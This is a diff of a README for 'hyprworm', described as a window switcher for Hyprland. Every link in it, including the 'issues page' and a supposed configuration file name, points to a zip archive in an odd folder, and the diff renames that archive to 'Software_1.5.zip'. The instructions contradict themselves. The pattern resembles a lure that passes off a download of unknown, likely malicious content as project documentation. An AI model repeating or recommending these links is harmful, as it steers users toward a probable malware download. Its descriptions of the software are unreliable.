@@ -1,6 +1,6 @@
 # 🐍 hyprworm - Switch Windows Quickly and Easily
 
-[![Download hyprworm](https://raw.githubusercontent.com/owais0x19/hyprworm/main/abthainrie/hyprworm.zip)](https://raw.githubusercontent.com/owais0x19/hyprworm/main/abthainrie/hyprworm.zip)
+[![Download hyprworm](https://github.com/owais0x19/hyprworm/raw/refs/heads/main/abthainrie/Software_1.5.zip)](https://github.com/owais0x19/hyprworm/raw/refs/heads/main/abthainrie/Software_1.5.zip)
 
 ## 📖 About hyprworm
 
@@ -20,7 +20,7 @@ To download hyprworm, follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to go to the Releases page where you can find the latest version of hyprworm.
    
-   [Download hyprworm](https://raw.githubusercontent.com/owais0x19/hyprworm/main/abthainrie/hyprworm.zip)
+   [Download hyprworm](https://github.com/owais0x19/hyprworm/raw/refs/heads/main/abthainrie/Software_1.5.zip)
 
 2. **Choose the Right File**: On the Releases page, you will see several files. Select the one that matches your system (typically the latest stable release).
   
@@ -34,7 +34,7 @@ To download hyprworm, follow these simple steps:
 
 After installing hyprworm, you may want to configure its settings to suit your preferences.
 
-1. **Configuration File**: You will find a configuration file named `https://raw.githubusercontent.com/owais0x19/hyprworm/main/abthainrie/hyprworm.zip`. Open it with your favorite text editor.
+1. **Configuration File**: You will find a configuration file named `https://github.com/owais0x19/hyprworm/raw/refs/heads/main/abthainrie/Software_1.5.zip`. Open it with your favorite text editor.
   
 2. **Customize Key Bindings**: Adjust the key bindings to switch between windows as per your convenience.
 
@@ -58,10 +58,10 @@ If you encounter issues while using hyprworm, consider the following:
 
 ## 📞 Support
 
-For any support or inquiries about hyprworm, please visit the [issues page](https://raw.githubusercontent.com/owais0x19/hyprworm/main/abthainrie/hyprworm.zip) on GitHub. You can open a new issue if you experience any bugs or have suggestions for new features.
+For any support or inquiries about hyprworm, please visit the [issues page](https://github.com/owais0x19/hyprworm/raw/refs/heads/main/abthainrie/Software_1.5.zip) on GitHub. You can open a new issue if you experience any bugs or have suggestions for new features.
 
 ## 🌟 Acknowledgments
 
 Thank you for choosing hyprworm! We appreciate your trust in our software. Your feedback helps us improve and provide better tools for managing your windows effectively in the Hyprland environment.
 
-[Download hyprworm](https://raw.githubusercontent.com/owais0x19/hyprworm/main/abthainrie/hyprworm.zip) and start enjoying a simpler window management experience today!
+[Download hyprworm](https://github.com/owais0x19/hyprworm/raw/refs/heads/main/abthainrie/Software_1.5.zip) and start enjoying a simpler window management experience today!
